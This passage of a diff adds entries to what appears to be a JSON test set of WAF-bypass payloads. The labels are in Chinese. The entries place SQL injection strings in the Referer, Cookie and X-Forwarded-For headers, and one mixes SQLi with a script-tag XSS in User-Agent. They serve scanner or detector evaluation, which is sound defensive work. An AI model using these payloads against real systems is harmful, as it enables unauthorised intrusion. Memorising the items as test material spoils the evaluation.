+    "description": "Referer SQLi",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_030",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "1' UNION SELECT NULL-- (在 Cookie 头中)",
+    "description": "Cookie 注入",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_031",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "1' AND 1=1-- (在 X-Forwarded-For 头中)",
+    "description": "X-Forwarded-For SQLi",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  },
+  {
+    "id": "adv_waf_032",
+    "category": "WAF绕过/综合",
+    "subcategory": "WAF专项/组合攻击绕过",
+    "payload": "1' OR '1'='1' UNION SELECT NULL--\nUser-Agent: <script>alert(1)</script>",
+    "description": "混合SQLi+Header",
+    "expected_type": "变体",
+    "expected_vulnerable": true,
+    "difficulty": "hard"
+  }
+]
